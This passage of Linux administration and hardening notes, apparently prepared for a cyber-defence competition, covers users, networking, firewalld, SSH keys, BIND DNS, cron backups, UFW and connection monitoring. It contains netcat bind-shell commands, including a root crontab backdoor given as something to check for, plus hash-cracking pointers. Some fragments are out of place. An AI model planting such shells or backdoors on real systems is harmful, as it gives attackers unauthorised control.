These commands can be used to determine which groups can be added to the `/etc/sudoers` file. Particularly the line that says **Allow members of group sudo to execute any command** should be noted, as individual users can be added to the `%sudo` group. In certain cases, groups can be added to this portion of the file to grant members of the specified group to execute any command; doing so requires the group name to be prepended by a `%`.

To modify an individual users group account, the following can be done from user account with sudo privileges:
```bash
sudo usermod [-a] -G sudo <User>
```
* The `usermod` command allows sudo users to modify different attributes that are associated with an account, including groups. This command append to the existing groups that a user is associated with or overwrite the associated user groups
   * The `-a` flag is used to append
   * The `-G` flag is used to specify an existing group that the user is to be added to
* If the user has an active session while group changes were made, *they may have to exit and start a new session for the group permissions to take effect*

The group configuration file is located in `/etc/group`. Like the sudoers file, this should not be directly edited; the `usermod` command should be used in lieu. In this file, the `gid` and users associated with the group will be present, separated by commas.  

<a id="pwandshdwhashes"></a>

#### **`Passwords and Shadow Hashes`**

Any user can change their own password through the `passwd` command. If a user has sudo permissions, they can change the password of other users without knowing the current password:
```bash
sudo passwd <User>
```

Although the `/etc/passwd` file exists, it does not store password information. This file lists service and user accounts, with the user-created accounts towards the bottom. 
* For accounts that can be logged in to, the final portion often specifies `/bin/bash`. This means that the account uses a bash shell to interact with the terminal. 
   * The accounts that end with `/nologin` are not accessible. This can be used to disable an account, changing `/bin/bash` to `/usr/sbin/nologin`


**Password information is stored in the `/etc/shadow` file.** This file should require sudo privileges to access. Accessible accounts will have a hash to represent the password, from the first colon to the proceeding colon (including the `/`). The computer will save the hash of the user's password; everytime the password is input, the computer will hash it and compare it to the stored hash for authentication. 
* The `$6$` represents a salt added to the hash. 

Besides brute forcing the hash through john, the hash can be calculated via Python
```py
import crypt

crypt.crypt("password", "$6$.......$")
```

<a id="explntwkconf"></a>

#### **`Networking Configuration`**

**<u>Ubuntu</u>**

The `ifconfig` command on Ubuntu is oftentimes not installed. In this case, the `ip a` command can be used in lieu. The `a` flag outputs all of the available network interfaces:
* **`lo`:** Represents the loopback interface. This is used for internal testing, using the default localhost (127.0.0.1) IP address

* **`ens18`:** On Ubuntu systems, this is the name of the first interface. By default, Ubuntu systems have a `/etc/netplan/01-network-manager-all.yaml` file that contains networking configuration for the device. On computers with a more advanced networking configuration, however, there may be more than one file in this netplan directory. This file can be modified to statically configure an IP address or DHCP:
```bash
sudo nano /etc/netplan/01-network-manager-all.yaml

network:
  version: 2
  renderer: NetworkManager
  ethernets: 
    ens18: 
      addresses:
        - x.x.x.x/CIDR
```
* By default, this file will contain the `version` and `renderer` only. Also, there will be two spaces behind them, which needs to remain consistent for the added `ethernets` value.
   * The `ens18` value will have a total of four spaces before it, as it must follow the initial spacing rules. `addresses` must have a total of six spaces before it. Remember to include the `-` before the IP address
   * Also, use CIDR notation for the subnet mask; do not include spaces

After the IP address is manually changed, the service needs to be restarted. This can be done via **`sudo netplan apply`**


**<u>The following two commands can be done on both Ubuntu and Kali:</u>**

It is also possible to create a **temporary IP address** through the `ip` command:
```bash
sudo ip addr add x.x.x.x/CIDR dev <ens18 or ethX>
```

> Temporary IP addresses are not saved with a system restart. In this case, the input IP address through the ip command will not be saved to the /etc/netplan/01-network-manager-all.yaml file

Again, the `ip` command can be used to flush IP addresses on an interface:
```bash
sudo ip addr flush dev <ens18 or ethX>
```


<br>

**<u>Kali</u>**

The `ifconfig` command is often installed via the `net-tools` package on the Kali distribution. However, the `ip a` command should still be used to show the available interfaces:
* **`lo`:** Represents the loopback interace. This is the same as the Ubuntu distribution. This should not be modified, as by default it should be the localhost address, but if for any reason needs to be changed, it can be found within the `/etc/network/interfaces` file

* **`eth0`:** This interface is often included in Kali systems. The `/etc/network/interfaces` file is used to statically configure an IP address or use DHCP to have an IP address assigned to this interface:
```bash
sudo nano /etc/network/interfaces

# The loopback network interface
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet <dhcp> <static> # if dhcp, just write dhcp. if static, continue but write static
    address x.x.x.x
    netmask x.x.x.x
```

After the IP address is manually changed, the service needs to be restarted. This can be done via `sudo systemctl restart networking`. For an external facing machine, the address and netmask do not need to be specified.

<br>

**<u>CentOS</u>**

The `ip a` command should be used in this distribution to list available interfaces:
* **`lo`:** Represents the loopback interface. This interface can be viewed and edited through the `/etc/sysconfig/network-scripts/ifcg-lo` file.

* **`eth0`:** Because CentOS is typically installed on routers, it will often have multiple interfaces. This is not to say that Kali or Ubuntu cannot have multiple interfaces, as they can have WLAN adapters and an Ethernet adapter to have more interfaces. However, with CentOS, the different interfaces must be configured to have connections to the different networks. The `/etc/sysconfig/network-scripts/` directory contains `ifcfg-ethX` files, where where X represents the specific interface to be configured. Depending on how many interfaces are, there may be several files. The following command can be done to assign a static IP address to the eth0 interface:
```bash
sudo vi /etc/sysconfig/network-scripts/ifcfg-eth0

...
BOOTPROTO=<dhcp or static>    #keep as dhcp if it is to be used; do not change the other options
...
ONBOOT=yes
IPADDR=x.x.x.x
NETMASK=x.x.x.x
```

After the IP address is manually changed, the service needs to be restarted. This can be done via `sudo systemctl restart network`.

#### **`Using Networking Service with Netcat`**

Netcat gathers network data for trying to establish connections for trying to read data that some server is giving off. Besides being used for shells, it allows users to see raw data from a server. The following shows how it can be used to represent a single client-server relationship
```bash
nc -lp 54321   # server

nc x.x.x.x 54321    #client
```
* In this case, the client and server can send text to each other simultaneously

As mentioned, nc can be abused. Instead of using the service like in the previous example, all of the received data can be redirected to another application that exists on the server, like `/bin/bash` to control the entire system. The following shows how this can be done:
```bash
nc -lp 54321 -e /bin/bash  #server

nc x.x.x.x 54321     #client
```
* This effectively opens a reverse shell, allowing the client command access to the server

**4. Enable SSL Changes**
```bash
sudo a2ensite default-ssl.conf

sudo systemctl reload apache2
```

<a id="routerconfig"></a>

#### **`Router and Gateway Configuration`**

While routing can be set up in many ways, the following is an initial way for routing to transpire from one network on one interface across an interface in another network. In CentOS, a lot of the routing occurs at the firewall, as it manages the rules of the connected network, specifically who's not allowed to send traffic across networks. Therefore, the firewall configuration should be checked first:

**1. Check Firewall Rules:** Most of the commands pertaining to the firewall require sudo privileges. The firewall takes the current configuration and breaks it up to several zones. The following command yields information about the zones that have already been set up.
```bash
sudo firewall-cmd --list-all-zones | less
```
* The firewall sets up one zone (public) as the default, denoted by **active.** Look at what has been applied to this zone, as it explains what types of rules and conditions are currently being applied to the various network connections. 
   * The previously set up interfaces are also in the active zone, denoted by **interfaces.**
   * The services that are allowed are listed next to the **services** row. By default, ssh and DHCP client are permitted. 
* Not every zone has the same defaults; zones are configured differently and not every zone is used simultaneously. Initially, the most important zone is the active one, as it contains the set up interfaces. Of course, the interface(s) can be changed to another zone to have a different set of rules applied to it. 

<br>

**2. View Specific Zones**
```bash
sudo firewall-cmd --list-all --zone=<Zone>
```

<br>

**3A. Assign Interfaces to the External and Internal Zones via ifcg:** The previously configured interfaces can both be assigned to the public zone and allow routing, however, it is not an ideal configuration. An interface can be assigned to a different zone that is designed to enable routing. The zones that are best equipped for this are the **External Zone** and the **Internal Zone.** There are two basic ways to do this
```bash
sudo vi /etc/sysconfig/network-scripts/ifcfg-eth0

...
BOOTPROTO=<dhcp or static>    #keep as dhcp if it is to be used; do not change the other options
...
ONBOOT=yes
IPADDR=x.x.x.x
NETMASK=x.x.x.x
ZONE=<external or internal>
```
* The first method of applying an interface to a specific zone includes **adding the zone variable to the ifcg file when configuring the interface in the first place.** This is the quickest way. After this is done, the interface must be restarted via the `sudo systemctl restart network` command.

**3B. Assign Interfaces to the External and Internal Zones via the CLI**
```bash
sudo firewall-cmd --change-interface=<ethX> --zone=<internal or external> --permanent

sudo firewall-cmd --reload    #apply the permanent flag; only use if the --permanent flag is applied
```
* If just testing a configuration change, the `--permanent` flag does not have to be included. However, if it is not included, the interface assignment is temporary and will not survive system or service restarts. 
* If the `--permanent` flag is used, it doesn't get applied until the service is restarted. To establish the changes, the second command should be used. 

<br>

After either of these methods are done, the rules that are associated with the internal or external interface are going to be used with the IP addresses assigned to that interface. Of course, the internal IP address should be assigned to the internal zone and the external IP address should be assigned to the external zone. At this point, run the `sudo firewall-cmd --list-all --zone=<external or internal>` to view the **services** associated with each zone. **The services allowed on each zone can be modified, allowing or restricting incoming connections to the computer on the service-ports. This is shown on *step #blank*** 
* For the **External Zone,** the **`ssh`** service is enabled by default.

* For the **Internal Zone,**  **`ssh`, `mdns` `sambda`, and `DHCP client`** are enabled by default. 

<br>

On the external zone, masquerading is enabled by default. **Masquerading** allows internal devices to use this as a router and go out to the external network. Internal devices should be able to use the router as their gateway to access external services. For this reason, **masquerading** should be enabled on the external zone. 

**4. Forward External Traffic to an Internal Service from the Router (Adding a Port Forward):** From a routing perspective, if there is a [desired] public service (i.e., web server) on an internal network, traffic from the outside should be able to access it. While the following command will be specific to a web server, it can be used for other services.
```bash
sudo firewall-cmd --zone=external --add-forward-port=port=80:proto=tcp:toport=80:toaddr=<Internal Service Address> --permanent

sudo firewall-cmd --reload    #apply the permanent flag; only use if the --permanent flag is applied
```
* This command essentially allows any foreign address to visit the internal [web] service via the external IP address of the router. Anytime a foreign address sends a request to the external IP address of the router, it will be forwarded to the internal web server in this case. 
   * The router firewall is acting as a layer of protection so that foreign users don't access the web server directly; the external users are being effectively filtered through the router. This is known as a **Forward,** as the router will take the request and pass it on to another device. 
   * **DO NOT ADD A SERVICE TO THE ROUTER** if the router itself is not running the web page. In most cases, it is not and adding a service to the router will broaden the attack surface. 

<br>

**5. Set up Gateway for Internal Machines:** The internal machines must have a gateway to access external networks. In order for the traffic on the internal machines to find their way back, gateways must be configured. **The gateway of these internal machines must be the internal IP address of the router,** so if a request comes in, it will get forwarded to the respective internal machine (due to the router's port forwarding), and when the internal machine responds, it will send the traffic through its default gateway (router's internal IP address) which will send the traffic to the external side due to masquerading. **The following command is done on the internal machine, NOT ON THE ROUTER.**
```bash
# Ubuntu
sudo nano /etc/netplan/01-network-manager-all.yaml

network:
  version: 2
  renderer: NetworkManager
  ethernets: 
    ens18: 
      addresses:
        - x.x.x.x/CIDR
      gateway4: x.x.x.x
```
* After the gateway is added (the netmask does not need to be specified), save the changes via the **`sudo netplan apply`** command and restart the service running on the machine; in this case, the apache2 service: **`sudo systemctl restart apache2`**

The following command is for an internal Kali machine:
```bash
# Kali
sudo nano /etc/network/interfaces

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet <dhcp> <static>
      address x.x.x.x
      netmask x.x.x.x
      gateway x.x.x.x
```
* After the gateway is added, save the changes via the **`sudo systemctl restart networking`**

#### **`SSH Service Basics`**

To determine whether an SSH service is already installed, the following command can be executed:
```bash
systemctl status [ssh, sshd]
```

After determining whether an ssh service is installed on the machine, view the configuration files in `/etc/ssh`. The files within this directory are crucial for setting up a secure ssh server. 
* **`ssh_config`**

* **`sshd_config`:** This file contains the default port (22) of ssh. To change this port, first make sure that it does not conflict with other services. Once it is determined that no other services will be affected, access this file with sudo privileges, uncomment the port line, and then change the port. Also, specific listening addresses can be specified; if at the default **0.0.0.0** address, any IP address assigned to the device can be the specific listening address. If this is changed to a specific address, only that address will listen for incoming ssh connections. The **`PermitRootLogin`** setting allows the root user to be logged in to from an incoming connection. To enforce strict security, this can be uncommented and no can be specified

As more ssh connections are established, folders will be created on the client side. These can be seen by the `ls -a` command in the `~/.ssh` folder; the `known_hosts` file is located within this directory, which contains the public keys of the connected ssh servers. To generate new keys, the following command can be performed:
```bash
sudo ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key  #overwrite the existing key pair
```

At this point, computers that have previously connected to the ssh server will get an error stating that the remote host identification has failed. They will not receive the login prompt; to fix this, the known_hosts file must be deleted or the corresponding entry can be removed. 

<br>

Through ssh, **`Passwordless Authentication`** is possible. On the server side, an account can be set up to use this passwordless authentication; keys are used to log in instead of a password. Typically, a new user is created for this specific function (hence the sudo command in the `mkdir` command); the first method of setting this up is done by creating the necessary files, as follows:

**1.Generate keys from a privileged account**
```bash
sudo ssh-keygen -t ecdsa -f ~/id_user_key

```
**2. Make sure the keys have appropriate permissions**
```bash
sudo chmod 600 id_user_key

sudo chmod 644 id_user_key.pub 

```
**3. Send public key to the authorized_keys of the local user:** If the **`.ssh`** directory doesn't exist, create it
```bash
sudo cp ~/id_user_key.pub /home/user/.ssh/authorized_keys

```

**4. Make sure the .ssh directory and authorized key file has appropriate permissions**
```bash
sudo chmod 644 /home/user/.ssh/authorized_keys

sudo chmod 700 /home/user/.ssh

```
**5. Change ownership to corresponding user**
```bash
sudo chown user:user /home/user/.ssh/authorized_keys
sudo chown user:user /home/user/.ssh
```
**6. Securely copy the private key from the privileged user's home directory:** Copy this to a secure directory, or do this command in a secure directory specify the current directory with the period (.)
```bash
scp <user>@<IP address>:/home/priv_user/id_user_key .

```
At this point, the client computer can authenticate without a password:
```bash
ssh -i id_<user>_key <user>@<IP address> 

```
Setting up passwordless authentication can also be automated, running the following command on the server to automatically create the necessary files:
```bash
sudo ssh-keygen -t ecdsa -f /home/<user>/id_<user>_key

sudo ssh-copy-id -i /home/<user>/id_<user>_key <user>@<IP address>
```
This command installs the specified ssh keys on one's own ssh server. For that reason, the user should be the logged in user, and the IP address should be the same IP address of the current machine. Through this command, all of the permissions are set, so the **`scp`** command can be done right away.

#### **`SSH Service Through the Router`**

Again, by default, the external zone on CentOS enables ssh on the router. This is different from the port forwarding concept: services enabled on the CentOS machine allow external connections for that service on the CentOS machine, while port forwarding allows external devices (to the CentOS router) to communicate with internal devices (again, to the CentOS router) and vice-versa. The following focuses on the former, so the first step is to look at the status of the sshd service on the CentOS device:
```bash
systemctl status sshd
```
Once it is confirmed that the sshd service is active, look at the `/etc/ssh` folder. Like Kali and Ubuntu, the ssh configuration files and key-pairs will be listed. Similarly, **if the CentOS machine is cloned, the private key will not be secure,** as every other clone has the same key-pair. Remember to generate new ssh keys before setting up the external zone using the same commands as Ubuntu

<br>

Also, if the service is active, external machines can log in to the CentOS machine via ssh by default. Depending on the needs of the network, this setting can remain the same or be modified. This can be changed to only allow external ssh connections, or only internal ssh connections. 


Like the external zone, the internal zone also enables certain services, including: ssh, samba, dhcp client, and mdns. This can be confirmed by looking at the firewall settings of the internal zone:
```bash
sudo firewall-cmd --list-all --zone=internal

```
For the purposes of the NCAE competition, the external zone should not allow external ssh connections to the CentOS router; only the internal zone should be able to connect to the router. The following command changes these permissions:
```bash
sudo firewall-cmd --zone=external --permanent --remove-service=ssh

sudo firewall-cmd --reload

```
If, for whatever reason external ssh connections are desired, the following command adds the service again:
```bash
sudo firewall-cmd --zone=external --permanent --add-service=ssh

sudo firewall-cmd --reload

```

```bash
sudo firewall-cmd --zone=external --permanent --add-forward-port=port=22:proto=tcp:toport=22:toaddr=<IP Address>

sudo firewall-cmd --reload
```

#### **`DNS Service Basics`**

From a client's perspective, DNS allows two questions:

**1. `Forward Lookup`:** Translates a domain name to the associated IP address. 

**2. `Reverse Lookup`:** Translates an IP address to the associated domain name.

With Linux distributions, DNS configuration files will not all be the same. They will vary from distribution to distribution, but this section focuses specifically on setting up a DNS server on an Ubuntu machine. 

<br>

First, get the IP address of this machine through the **`ip a`** command. The following are important steps into configuring the DNS server on this machine/

**1. Determine DNS Service Status**
```bash
systemctl status named

```

**2. Locate Important Configuration Files:** One of the most common installable DNS servers is known as **`BIND`.** Once it has been installed, there will be a directory located in `/etc/bind` that contains all of the related information. Within this directory, there will be a **`named.conf`** file, which contains most of the important configurations for the DNS server. Saying this, when checking the status of the DNS server, bind will not oftentimes not exist; it will be named.
* When freshly installed, the **`/etc/bind/named.conf`** file only includes other configuration files that do most of the work. These configuration files determine how the DNS server is set up; they are either segmented into different configuration files, or in one particular (named.conf) configuration file. More often than not, these configuration files are segmented for better manageability
   * **`/etc/bind/named.conf.options`** 
   * **`/etc/bind/named.conf.local`** 
   * **`/etc/bind/named.conf.default-zones`**

**At this point, the goal is to allow a locally hosted web server to be referenceable from a DNS server.** This allows internal network users to type a domain name on their browser instead of typing an IP address.

**3. Modify named.conf.default-zones:** This configuration file references the db.X files within the /bind directory. At this point, additional zones should be written into this file to allow forward and reverse lookups:
```bash
sudo nano named.conf.default-zones

# Go to the bottom of this file and set up additional zones

zone "domain.com" IN {        #forward lookup
      type master;
      file "/etc/bind/<new_dir>/forward.lookup.com";
      allow-update { none; };
};

zone "c.b.a.in-addr.arpa" IN {       #reverse lookup; write the network address in reverse order followed by the special notation
      type master;
      file "/etc/bind/<new_dir>/reverse.lookup.com";
      allow-update { none; };
};

```

**4. Create the Referenced Directories and Files:** Copy the `/etc/bind/db.empty` file twice to the newly created directories. It is better to copy this file because the permissions and ownership are retained
```bash
sudo mkdir <new_dir>

sudo cp /etc/bind/db.empty /etc/bind/<new_dir>/reverse.lookup.com

sudo cp /etc/bind/db.empty /etc/bind/<new_dir>/forward.lookup.com

```

**5. Configure the Referenced Files:** Remember that the text after the semicolons are commented out. The db.empty includes generic information, so they have to be edited. The following is file before any configuration:
```bash
$TTL    86400
@       IN      SOA     localhost. root.localhost. (
                              1         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                          86400 )       ; Negative Cache TTL
;
@       IN      NS      localhost.

```

For the **<u>Forward File:</u>** 
```bash
sudo nano /etc/bind/<new_dir>/forward.lookup.com

$TTL    86400
@       IN      SOA     domain.com root (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                          86400 )       ; Negative Cache TTL
;
@       IN      NS      <DNS Server hostname>
<DNS hostname>          IN A        <DNS server IP address> #The DNS server should be included as a potential subdomain
www                     IN A        <web server IP address>
<more subdomains>       IN A        <web server IP address>
```
* From the generic file, replace the `localhost.` portion on the first line with the intended forward domain.
  *  Do **NOT** include the period
* On the same line, after the `root` text, remove the `.localhost.` text.
  * Keep the root portion, but do not include the periods before and after the localhost text.
* Increment the `Serial` line by one every time the file is modified for the change to take effect

* On the final line, replace the `localhost` text with the hostname of the DNS server. 
  * Again, do **NOT** keep the period after this. 
* After the final line, provide the subdomains followed by the IP address of the web server
  * subdomain [tab] IN A [tab] IP address
  * The DNS server should also be included as a potential subdomain, and should resolve to itself in the event that it is queried. 

<br>

For the **<u>Reverse File:</u>** 
```bash
sudo nano /etc/bind/<new_dir>/reverse.lookup.com

$TTL    86400
@       IN      SOA     domain.com. root.domain.com. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                          86400 )       ; Negative Cache TTL
;
@       IN      NS      <DNS Server hostname>.
x       IN  PTR         <DNS server hostname>.domain.com.
y       IN  PTR         www.domain.com.
y       IN  PTR         <subdomain>.domain.com
```
* From the generic file, replace the `localhost` portion on the first line with the intended domain.
  *  **INCLUDE the period**
* On the same line, after the `root` text, remove the `localhost` text and replace it with the domain. 
  * **Keep the periods** before and after the domain name
* Increment the `Serial` line by one every time the file is changed for it to take effect.

* On the final line, replace the `localhost` text with the hostname of the computer.
  * Again, **Keep the period**
* After the final line, write the IP addresses of the associated subdomains. Because the network address is written in reverse for reverse lookups, the included host information must follow the same rules. **Add periods after the domain.** 
  * This depends on the subnet mask; **the example shows a /24 mask, which is the same if it is reversed because it is only one octet.** The example shows x and y to represent the different IP addresses of the web server and DNS server; the final octet (x/y) is different.
    * Essentially, the octets are written in reverse, so w.x.y.z /16 will be c.d in this file. 
  * reverse octet [tab] In PTR [tab] subdomain.domain

<br>

**6. Update `/etc/resolv.conf` with the new DNS Server:** The computer must know where the DNS servers are for the DNS service to work. In this case, either the `/etc/netplan/01-network-manager-all.yaml` file can be modified to include a **nameserver** clause, or, better yet, the /etc/resolv.conf file can be edited:
```bash
sudo nano /etc/resolv.conf

nameserver x.x.x.x

```

**7. Test DNS Server:** Now that everything is configured, the DNS server can be activated. If the service does not start when booted, then it was misconfigured. If it starts, try both forward and reverse lookups through the web browser or CLI
```bash
sudo systemctl start named
```

To add an additional forward lookup subdomain entry to the DNS server for a web server hosted on another machine (not the Ubuntu machine), the following steps need to be done:

**2. Modify the File**
* Increment the Serial number
* Add a subdomain and associated IP address
   * subdomain [tab] IN A [tab] IP address

**3. Restart NS Service**

```bash
sudo nano /etc/bind/<new_dir>/reverse.lookup.com
```

#### **`Rsync and Cron Service Basics`**

**<u>Rsync</u>**

It is important to create backups for the running services on a machine. **`Rsync`** is used for backups and copying files on Linux. To effectively use rsync, a backup folder should be created to hold the backup contents. 
```bash
rsync -av --delete <Path/to/orginaldir> <Path/to/backupdir>
```
* The `-av` flag allows the copying of information from one location to another

* The `--delete` flag can be used to enforce consistency from the original directory to the backup directory. This essentially means that if one of the files was deleted in the original directory and the rsync command is run again, then the file will also be removed from the backup directory. This flag is optional, and depends on the needs of the network. 

If changes were made to a file after using the rsync command, they will remain only on the original copy until the rsync command is done again. When the command is run again, the rsync will show the user if changes have been made to a file by outputting the file name. This is what makes rysnc more effective than the `cp` command in certain cases. 

<br>

**<u>Cron</u>**

**`Cron`** helps administrators set up routine automated tasks. This service can be used to enable the automated scheduling of rsync. To determine whether cron is running, the following command can be performed:
```bash
systemctl status [cron, crond]

```

**`Crontabs`** are files that are created on the computer that could include automatic commands that are supposed to run. To add scheduled tasks, this file must first be opened with the following command, which prompts the user to select a text editor:
```bash
crontab -e 

```
* This command displays commented out instructions on creating a cron rule. Every time this command is run and a rule is created, cron automatically creates a specific crontab in the **/var/spool/cron/crontabs/\<user\>** directory.
   * The time of the automation can be set to concrete values or unrestricted. The setup will therefore be: `minute, hour, day of month, month, day of week`, where any value can be ***any*** by using the `*` value. 
   * If a crontab has a `*` for every value, that means every minute of every day. 

For example, the following command runs a backup of all the user accounts at 5 a.m. every week:
```bash
0 5 * * 1 tar -zcf /var/backups/home.tgz /home/

```
> After adding a rule to the cron tab, either wait a couple of minutes for the service to work OR restart the service by `sudo systemctl restart cron`

To view the exact location of the created crontab, sudo privileges are required. The following command can be used:
```bash
sudo ls /var/spool/cron/crontabs

```
As alluded, every time a user creates a crontab, a new file will be created in this directory with those user's crontabs. 

<br>

At this point, cron can be used with rsync for automatic backups:
```bash
crontab -e 

...

* * * * * rsync -a [--delete] /Absolute/Path/to/Originaldir /Absolute/Path/to/Backupdir

```

There are also system-wide crontabs, located in **`/etc/crontab`.** This file is owned by root, with **644** permissions; only root can edit this file. The set up of this file is similar to that of the user crontabs, with minor changes. The crontabs in this file will occur regardless of whether the user is active or not, hence why a user must be specified. For critical tasks, it is recommended that they are included in this file with **`root`** as the username. With this file, it is important to determine which services are critical to the machine and require minimum downtime. Consider the files that are linked to those services and back them up. 
```bash
sudo nano /etc/crontab

* * * * * root rsync -a /Absolute/Path/to/Originaldir /Absolute/Path/to/Backupdir

```
Also, make sure to look at the contents of this file. A backdoor can be created for the root user using netcat. This can be done with the following command:
```bash
sudo nano /etc/crontab

* * * * *  root nc -lp <port> -e /bin/bash
```

#### **`Rsync and Cron Automatic Secure Backups`**

Backups can also be sent to another device on the network. If ssh is available on the *backup machine*, secure connections can be created using rsync. First, on the *backup machine*, determine whether an ssh server is available:
```bash
systemctl status [ssh, ssh]

```

If ssh is available, but it is inactive, start the service:
```bash
sudo systemctl restart ssh
```
By default, this server should allow connections to any available IP addresses on the machine on port 22. Therefore, once this service is activated, other machines should be able to connect via ssh. Once it is confirmed that a connection can be established, **the *backup machine* should create a backup folder** to hold the backups of the main machine.

Now, on the main machine, run the following command to use rsync across ssh:
```bash
rsync -av [--delete] -e ssh /Absolute/Path/Main/Computer <username>@<IP address>:/Absolute/Path/Backup/Computer/
```
* The `-e` flag is used to execute rsync using another service, like ssh, telnet, ftp, etc

<br>

To combine this functionality with **`cron`,** the user must first prove that they can authenticate with ssh across the network, but will be unable to do so because the password prompt will be backgrounded. In this case, **`Passwordless Authentication`** can be used for ssh to avoid directly including the ssh password in the crontab file or having to manually type the password everytime the cron service is scheduled. While following the proceeding steps, it is important to be mindful of the keys, as an attacker could potentially gain access to the backup server due to mismanaged keys:

**1. Create Key-Pair on the Client** 
```bash
ssh-keygen -t ecdsa -f backup_keys
```

Once the keys are generated, the **`client` must keep the `private key`** and the **`server` (where the authentication happens) must be securely given the `public key`.** The permission of the private key is critical at this stage, so ensure that it only has rw permissions for the owner. 

**2. Securely Store the Private Key:** For create an effective automatic backup, the crontab should not be created for a specific user but for the system; therefore, the root user should be given the private key to run the backup automatically. In this case, **the private key should be stored in the `/root` directory** to ensure that only users with proper credentials can access it. 
```bash
sudo chown root:root backup_keys

sudo mv backup_keys /root

```

**3. Securely Copy the Public Key to the Server:** After the public key is transferred to the server, the administrator can either delete it from their machine or move it to the /root directory with the private key. It is a better idea to move it to the /root directory.
```bash
scp backup_keys.pub <username>@<IP address>:<Absolute/Path/Backup/Computer>

```

**4. Configure Passwordless Authentication on the Server:** Once the public key is on the *backup machine*, the **public key must exist in the `~/.ssh/authorized_keys` file.** If the server does not yet have this directory and file created, it can be created through the following:
```bash
mkdir ~/.ssh 

chmod 700 ~/.ssh

cp backup_keys.pub ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys    #in certain distros, this can also be 644

```

**5. Run Rsync on Client for Specific User on Server:** In the following command, the ssh command is wrapped in quotes to specify that the `-i` flag is for ssh and not rsync. 
```bash
sudo rsync -av -e "ssh -i /root/backup_keys" /Path/Main/Computer/ <username>@<IP address>:/Absolute/Path/Backup/Computer/

```

**6. Run Rsync as Crontab via Passwordless Authentication**
```bash
sudo nano /etc/crontab

...

* * * * * root rsync -a -e "ssh -i /root/backup_keys" /Absolute/Path/Main/Computer/ <username>@<IP address>:/Absolute/Path/Backup/Computer/
```
* In this example, the `/` ending after the directory that contains the files that are to be backed (/Absolute/Path/Main/Computer/) up forces rsync to only backup the files within the directory. If the `/` is excluded after the directory, then the directory that contains the files will also be backed up

<a id="introtofwswufw"></a>

#### **`Intro to Firewalls with UFW`**

Most Linux systems have **`IP Tables`,** which are used to configure a firewall. Because IP tables are complicated, many administrators put additional software on top of the IP tables to help with management; in Ubuntu, **`UFW`** is this additional software. By default, UFW is inactive so the firewall rules are unrestricted initially. To view the initial status of UFW and activate it, the commands can be executed:
```bash
sudo ufw status verbose

sudo ufw enable

```

By default, incoming traffic is denied and outgoing traffic is allowed. Because of this, rules must be created; however, before creating any, it is important to determine what rules are appropriate for the machine, the network, and the environment:

**Creating a UFW Allow Rule:** Allow rules allow specific IP addresses or network ranges to send traffic. This should only be done if the machine/network is trusted. Once rules are added to UFW, they can be checked by using the aforementioned `status` command. 
```bash
sudo ufw allow from x.x.x.x   #specific IP address

sudo ufw allow from x.x.x.0/CIDR    #network range w/ CIDR

```

**Adding Service Rules:** This is important to add if services are running on the Ubuntu machine. If just allowing certain services without additional information, then UFW will automatically allow connections to the service from anywhere. Also, this will automatically create a rule for IPv6, which can open up the attack surface if IPv6 is not used within the network. 
```bash
sudo ufw allow ssh      #from anywhere

sudo ufw allow ssh from x.x.x.x

sudo ufw allow ssh from x.x.x.0/CIDR

```

**Removing Rules:** Because each user-created rule is numbered, it is possible to remove the rule by its assigned number. Everytime a rule is deleted, the numbered list is renumbered accordingly. 
```bash
sudo ufw status numbered

sudo ufw delete <number>

```

**Creating a UFW Deny Rule:** If an allow rule permits traffic from a specific IP address but the deny rule blocks traffic from that network, the order in which the rules are input will begin to matter. Because of this, it is important to create the allow rules first 
```bash
sudo ufw deny from x.x.x.x    #specific IP address

sudo ufw deny from x.x.x.0/CIDR     #network range w/ CIDR       

```

**Edit Default Rules:** When rules are added to UFW, the default rules may take precedence. For example, if a network was included in a deny rule, a user within that network may still be able to ping the machine with the UFW. In this case, the configuration files containing the default rules can be edited within the **`/etc/ufw`** directory. The **`before.rules`** contains rules that will process before the user-created rules. Accordingly, the **`after.rules`** file contains rules that process after the user-created rules.
* If needed, the **`/etc/ufw/before.rules`** file can be edited
   * Within the ICMP rules, each line ends with ACCEPT, thus allowing users on a denied network to ping the machine with the configured UFW. These can be changed with DROP for the ICMP INPUT rules. 
* Within this file, it is also important to note the difference between INPUT and FORWARD rules. **INPUT** refers to traffic coming into the host computer, and **FORWARD** refers to traffic going onto another computer. 

After making changes to the **before.rules** file, the firewall must be reloaded
```bash
sudo ufw reload

```

#### **`Active Connection Defense`**

To view active connections to the host machine, the **`netstat`** command can be used. The active connections are displayed at the top of the output, showing the local IP address followed by the service that is being used, and the foreign IP address followed by the ephemeral port. All of the information may be overwhelming, so netstat should be filtered to only show TCP and UDP information:
```bash
netstat -tu       #shows service name

netstat -tun      #resolves the name of the service

netstat -tuna     #shows what ports are listening on the local machine

sudo netstat -tunap    #shows PID and additional information for each connection

```

If an active connection needs to be terminated, the PID must be obtained first. Once obtained, the command can be killed:
```bash
sudo kill <PID>

```

If netstat is not installed, the **`ss`** command can be used in lieu. Be mindful that the active connections are displayed at the bottom of the output, showing effectively the same information as netstat. 
```bash
ss

```

To see who is logged in on the machine, the **`w`** command can be used. The output shows active connections from specific foreign IP addresses. If a user has a connection from **`:0`,** that means that they logged in using the GUI. Because of this, be weary of the active connections on foreign machines.  
```bash
w

```

An active connection can be terminated by usernames. If there are two people logged in as the same user, the foreign user should be terminated via PID. In this case, if the active connection is terminated by username, then both users will be logged out. 
```bash
sudo pkill -KILL -u <username>

```

Like Task Manager in Windows, the **`top`** command monitors system processes. **`ps`** can also be used, but should be used with additional flags to get more information:
```bash
ps -aux     #shows which users are running which processes 

```

To send broadcast messages to logged in users, the **`wall`** or **`write`** command can be used:
```bash
wall "<message>"

sudo write <user> <TTY>    #will start messaging session between the local and specified users
```

   * Check `Bridge All LAN Ports`

#### **`FTP Service Basics`**

One of the most used FTP servers on Linux distros is **`vsFTPd`.** The default configuration of vsFTPd can be found in **`/etc/vsftpd.conf`;** some settings are already predefined by default. To install vsFTPd, the following command can be executed:
```bash
sudo apt install vsftpd 

```
To look at the active configurations, the following command can be executed:
```bash
cat /etc/vsftpd.conf | grep -v "#"

```

The following are configurations that are present within the vsftpd configuration file. 

<center>

